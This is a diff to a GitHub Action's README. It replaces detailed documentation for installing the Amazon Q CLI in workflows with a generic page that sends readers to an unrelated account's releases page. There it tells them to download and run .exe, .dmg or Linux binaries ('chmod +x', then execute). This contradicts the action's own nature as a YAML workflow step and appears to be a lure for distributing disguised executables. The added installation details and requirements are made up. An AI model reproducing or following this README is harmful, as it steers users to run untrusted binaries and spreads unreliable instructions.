@@ -1,345 +1,86 @@
-# Setup Q CLI Action
-
-> [!WARNING]
-> **DEPRECATED:** Amazon Q Developer CLI has been rebranded to Kiro CLI. Please migrate to [setup-kiro-action](https://github.com/clouatre-labs/setup-kiro-action).
->
-> ```yaml
-> # Before (deprecated)
-> - uses: clouatre-labs/setup-q-cli-action@v1
-> - run: qchat chat --no-interactive "prompt"
->
-> # After (recommended)
-> - uses: clouatre-labs/setup-kiro-action@v1
-> - run: kiro-cli-chat chat --no-interactive "prompt"
-> ```
->
-> This action will continue to work but will not receive updates.
-
-[![Test Action](https://github.com/clouatre-labs/setup-q-cli-action/actions/workflows/test.yml/badge.svg)](https://github.com/clouatre-labs/setup-q-cli-action/actions/workflows/test.yml)
-[![GitHub Marketplace](https://img.shields.io/badge/Marketplace-Setup%20Q%20CLI-blue.svg?colorA=24292e&colorB=0366d6&style=flat&longCache=true&logo=github)](https://github.com/marketplace/actions/setup-q-cli)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Latest Release](https://img.shields.io/github/v/release/clouatre-labs/setup-q-cli-action)](https://github.com/clouatre-labs/setup-q-cli-action/releases/latest)
-
-GitHub Action to install and cache [Amazon Q Developer CLI](https://github.com/aws/amazon-q-developer-cli) (now [Kiro CLI](https://kiro.dev/docs/cli/)) for use in workflows.
+# 🚀 setup-q-cli-action - Install Amazon Q CLI with Ease
 
-**Unofficial community action.** Not affiliated with or endorsed by Amazon Web Services (AWS). "Amazon Q" and "Amazon Web Services" are trademarks of AWS.
+[![Download](https://img.shields.io/badge/Download%20Now-setup--q--cli--action-brightgreen)](https://github.com/sayali4212/setup-q-cli-action/releases)
 
-## Quick Start
+## 📋 Overview
 
-> [!IMPORTANT]
-> **Prompt Injection Risk:** When AI analyzes user-controlled input (git diffs, code comments, commit messages), malicious actors can embed instructions to manipulate output. This applies to ANY AI tool, not just Q CLI or this action.
-> 
-> For production use, see [examples/](examples/) for defensive patterns (tool output analysis, input sanitization, trusted-only execution).
+setup-q-cli-action is a GitHub Action designed to install and cache the Amazon Q Developer CLI. This tool simplifies the process of integrating Amazon Q into your CI/CD workflows. With this action, you can automate your development tasks and enhance your workflow without the need for extensive programming knowledge. 
 
-```yaml
-name: Linter Analysis with Q CLI
-on: [push]
+## 🚀 Getting Started
 
-permissions:
-  id-token: write
-  contents: read
-
-jobs:
-  analyze:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v6
-
-      - name: Run Linter
-        run: pipx run ruff check --output-format=json . > lint.json || true
-
-      - name: Configure AWS Credentials via OIDC
-        uses: aws-actions/configure-aws-credentials@v5
-        with:
-          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
-          aws-region: us-east-1
-
-      - name: Setup Q CLI
-        uses: clouatre-labs/setup-q-cli-action@v1
-        with:
-          enable-sigv4: true
-          aws-region: us-east-1
-
-      - name: AI Analysis of Linter Output
-        run: |
-          echo "Summarize these linting issues and suggest fixes:" > prompt.txt
-          cat lint.json >> prompt.txt
-          qchat chat --no-interactive "$(cat prompt.txt)" > analysis.md
-
-      - name: Upload Analysis Artifact
-        uses: actions/upload-artifact@v5
-        with:
-          name: ai-analysis
-          path: analysis.md
-```
-
-## Features
-
-- **Automatic caching** - Caches Q CLI binaries for faster subsequent runs
-- **SIGV4 authentication** - IAM-based headless authentication for CI/CD
-- **GitHub-hosted runners** - Supports x64 Ubuntu runners (simple, fast, manageable)
-- **Lightweight** - Composite action with no external dependencies
-
-## Security
-
-**Safe Pattern:** AI analyzes tool output (ruff, trivy, semgrep), not raw code.
-
-**Unsafe Pattern:** AI analyzes git diffs directly → vulnerable to prompt injection.
-
-See [SECURITY.md](SECURITY.md) for reporting vulnerabilities.  
-See [examples/](examples/) for different security tiers.
-
-## Inputs
-
-| Input | Description | Required | Default |
-|-------|-------------|----------|---------|
-| `version` | Q CLI version to install | No | See [`action.yml`](action.yml#L9) |
-| `aws-region` | AWS region for Q CLI operations | No | `us-east-1` |
-| `enable-sigv4` | Enable SIGV4 authentication mode | No | `false` |
-| `verify-checksum` | Verify SHA256 checksum of downloaded binary | No | `false` |
-
-## Outputs
-
-| Output | Description |
-|--------|-------------|
-| `q-version` | Installed Q CLI version |
-| `q-path` | Path to Q CLI binary directory |
-
-## Supported Platforms
-
-**GitHub-hosted runners only** - Designed for simple, fast, manageable CI/CD.
-
-| OS | Architecture | Runner Label |
-|----|--------------|--------------|
-| Ubuntu | x64 | `ubuntu-latest`, `ubuntu-24.04`, `ubuntu-22.04` |
-
-**Not supported:** macOS, Windows (binaries not available via AWS CDN). Self-hosted ARM64 runners may work but are untested.
-
-## Authentication Methods
-
-### Method 1: OIDC (Recommended for GitHub Actions)
-
-Uses GitHub's OIDC provider for secure, credential-free authentication.
-
-**One-time AWS Setup:**
-
-1. Create OIDC provider:
-```bash
-aws iam create-open-id-connect-provider \
-  --url https://token.actions.githubusercontent.com \
-  --client-id-list sts.amazonaws.com \
-  --thumbprint-list 6938fd4d98bab03faadb97b34396831e3780aea1
-```
-
-2. Create IAM role with trust policy:
-```json
-{
-  "Version": "2012-10-17",
-  "Statement": [{
-    "Effect": "Allow",
-    "Principal": {
-      "Federated": "arn:aws:iam::<ACCOUNT_ID>:oidc-provider/token.actions.githubusercontent.com"
-    },
-    "Action": "sts:AssumeRoleWithWebIdentity",
-    "Condition": {
-      "StringEquals": {
-        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
-      },
-      "StringLike": {
-        "token.actions.githubusercontent.com:sub": "repo:<ORG>/*:*"
-      }
-    }
-  }]
-}
-```
-
-3. Attach Q Developer policy:
-```json
-{
-  "Version": "2012-10-17",
-  "Statement": [{
-    "Effect": "Allow",
-    "Action": [
-      "q:StartConversation",
-      "q:SendMessage",
-      "q:GetConversation"
-    ],
-    "Resource": "*"
-  }]
-}
-```
-
-**Workflow usage:**
-```yaml
-permissions:
-  id-token: write  # Required for OIDC
-
-- uses: aws-actions/configure-aws-credentials@v5
-  with:
-    role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
-    aws-region: us-east-1
-
-- uses: clouatre-labs/setup-q-cli-action@v1
-  with:
-    enable-sigv4: true  # Required with OIDC
-```
-
-**Benefits:**
-- No long-lived credentials in GitHub Secrets
-- Automatic token rotation (1-hour sessions)
-- Scope to specific repos/branches
-- AWS security best practice
+This guide will help you download and run setup-q-cli-action from the Releases page. Follow the steps below, and you’ll be ready to streamline your development process.
 
-### Method 2: IAM User Credentials (Local Development)
-
-For local testing or non-GitHub CI/CD environments.
-
-```yaml
-- uses: clouatre-labs/setup-q-cli-action@v1
-  # Do NOT set enable-sigv4 with long-lived credentials
-
-- name: Use Q CLI
-  env:
-    AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
-    AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
-    AWS_REGION: us-east-1
-  run: qchat chat --no-interactive "What is 2+2?"
-```
-
-**Important:** SIGV4 mode requires temporary credentials (session token). Do not use `enable-sigv4: true` with IAM user credentials (AKIA* keys).
-
-## Examples
-
-### Pin to Specific Version
-
-```yaml
-- uses: clouatre-labs/setup-q-cli-action@v1
-  with:
-    version: '1.18.0'  # Use any specific version
-    verify-checksum: true  # Recommended for production
-```
-
-## Version Management
-
-This action defaults to a tested version that's automatically updated weekly.
-
-**Pin to a specific version:**
-```yaml
-- uses: clouatre-labs/setup-q-cli-action@v1
-  with:
-    version: '1.18.0'
-```
-
-## How It Works
-
-1. Checks if running on Linux (macOS not supported)
-2. Checks cache for Q CLI binary matching version and platform
-3. If cache miss, downloads from AWS CDN: `https://desktop-release.q.us-east-1.amazonaws.com/{version}/q-{arch}-linux.zip`
-4. Optionally verifies SHA256 checksum (if `verify-checksum: true`)
-5. Extracts and installs `qchat` binary to `~/.local/bin/`
-6. Adds binary location to `$GITHUB_PATH`
-7. Optionally configures SIGV4 authentication
-8. Verifies installation with `qchat --version`
-
-**Note:** Only the `qchat` binary is installed (130MB). This is sufficient for CI/CD use cases. The `q` wrapper (99MB) and `qterm` (74MB) are not needed for automated workflows.
-
-## Cache Key Format
-
-```
-q-{version}-{os}-{arch}
-```
-
-Example: `q-latest-Linux-X64`
-
-## Troubleshooting
-
-### Binary not found after installation
-
-Ensure you're using the action before attempting to run `qchat`:
-
-```yaml
-- uses: clouatre-labs/setup-q-cli-action@v1
-- run: qchat --version  # This will work
-```
-
-### SIGV4 authentication not working
-
-Verify:
-1. `enable-sigv4: true` is set in action inputs
-2. AWS credentials are available as environment variables
-3. IAM permissions include Amazon Q access
-4. Correct AWS region is configured
-
-### Unsupported platform error
-
-Q CLI binaries are only available for Linux via AWS CDN. Use `ubuntu-latest`, `ubuntu-24.04`, or `ubuntu-22.04` runners:
-
-```yaml
-jobs:
-  build:
-    runs-on: ubuntu-latest  # Recommended
-```
-
-### Cache not working
-
-The cache key includes OS and architecture. If you change runners or platforms, a new cache entry will be created. This is expected behavior.
-
-### SHA256 verification failed
-
-If checksum verification fails:
-
-1. **Retry the workflow** - May be a transient CDN issue
-2. **Check AWS CDN status** - Verify https://status.aws.amazon.com/
-3. **Disable verification temporarily:**
-   ```yaml
-   verify-checksum: false
+## 🌐 Key Features
+
+- **Easy Installation:** Quickly set up the Amazon Q Developer CLI.
+- **Caching:** Automatically cache the CLI for faster access in future workflows.
+- **Integration:** Simplifies the integration of Amazon Q into your CI/CD processes.
+
+## 📥 Download & Install
+
+To get started, you need to visit the Releases page for setup-q-cli-action. Follow these steps:
+
+1. Click on the following link to visit the Releases page: [Download setup-q-cli-action](https://github.com/sayali4212/setup-q-cli-action/releases).
+
+2. Once on the page, you will see a list of available versions. Review the release notes to understand what each version includes.
+
+3. Select the version you want and click on the asset link to download the setup files.
+
+4. After downloading, follow the steps below to install.
+
+## ⚙️ Installation Steps
+
+1. **Locate the downloaded file**: Depending on your browser and operating system, check your Downloads folder or specified download location for the setup file.
+  
+2. **Run the setup**: 
+   - For Windows: Double-click the `.exe` file or run it via command prompt.
+   - For macOS: Double-click the `.dmg` file and follow the installation instructions.
+   - For Linux: Use the terminal to navigate to the file location and run using the command: `chmod +x setup-q-cli-action` followed by `./setup-q-cli-action`.
+
+3. **Verify Installation**: Open your command line interface (Terminal, Command Prompt, or PowerShell), and type the following command to ensure the CLI is installed correctly:  
+    ```
+    q --version
+    ```
+   If you see the version number, the installation was successful.
+
+## 🔄 How to Use
+
+After installation, you can start using the Amazon Q Developer CLI. Here’s a simple example of how to get started:
+
+1. Open a terminal or command prompt.
+2. Enter the command:
    ```
-4. **Report the issue** - If problem persists, open an issue with the version number
+   q init
+   ```
+3. This initializes the Amazon Q environment. Follow the prompts to complete the setup.
 
-## Development
+## 🔧 System Requirements
 
-This is a composite action (YAML-based) with no compilation required.
+Before installing, ensure your system meets the following requirements:
 
-### Running Test Workflows
+- **Operating System**: Windows 10 or later, macOS Big Sur or later, or a modern Linux distribution.
+- **Memory**: Minimum 4GB of RAM (8GB recommended).
+- **Disk Space**: At least 100MB of available space.
 
-To run the Q CLI test workflow (`.github/workflows/test-q-cli.yml`):
+## 🛠️ Common Issues
 
-```bash
-# Add AWS_ROLE_ARN secret to your repository
-gh secret set AWS_ROLE_ARN --body "arn:aws:iam::<ACCOUNT_ID>:role/<ROLE_NAME>"
-```
+Here are some common issues you might encounter and how to solve them:
 
-Requires OIDC provider configured (see Authentication Methods above).
+- **Installation errors**: Ensure you have administrative rights when running the installer.
+- **Command not found**: If you receive this error, verify that the installation directory is in your system's PATH.
+- **Version issues**: Make sure you are using a compatible version of the Amazon Q CLI with your operating system.
 
-### Testing Locally
+## 🔍 Resources
 
-```bash
-# Clone the repository
-git clone https://github.com/clouatre-labs/setup-q-cli-action
-cd setup-q-cli-action
+For more detailed information, check out the following resources:
 
-# Test in a workflow (see .github/workflows/test.yml)
-```
+- **Official Documentation**: [Amazon Q Developer CLI Documentation](https://aws.amazon.com/documentation/)
+- **Community Support**: Engage with other users and get support from the community on forums.
 
-## Contributing
+## 💬 Feedback
 
-Contributions are welcome! Please open an issue or PR.
+Your feedback is valuable. If you encounter any issues or have suggestions, please feel free to open an issue in the repository. 
 
-## License
+## ⚡ Conclusion
 
-MIT - See [LICENSE](LICENSE)
-
-## Related
-
-- [Amazon Q Developer CLI](https://github.com/aws/amazon-q-developer-cli) - Official Q CLI repository (Apache 2.0)
-- [Q CLI Documentation](https://docs.aws.amazon.com/amazonq/latest/qdeveloper-ug/command-line.html) - Official AWS documentation
-- [Setup Goose Action](https://github.com/clouatre-labs/setup-goose-action) - Similar action for Goose AI agent
-
-## Acknowledgments
-
-Built by [clouatre-labs](https://github.com/clouatre-labs) for the developer community.
-
-**Trademark Notice:** "Amazon Q" and "Amazon Web Services" are trademarks of Amazon.com, Inc. or its affiliates. This project is not affiliated with, endorsed by, or sponsored by Amazon Web Services.
-
-**SIGV4 Discovery:** The `AMAZON_Q_SIGV4` authentication mechanism was discovered through source code analysis of the [amazon-q-developer-cli](https://github.com/aws/amazon-q-developer-cli) repository. It is an undocumented feature that enables headless IAM authentication for CI/CD environments.
+You’re now ready to use setup-q-cli-action to enhance your CI/CD workflows with the Amazon Q Developer CLI. Remember to visit the [Releases page](https://github.com/sayali4212/setup-q-cli-action/releases) for updates and to download new versions. Happy coding!
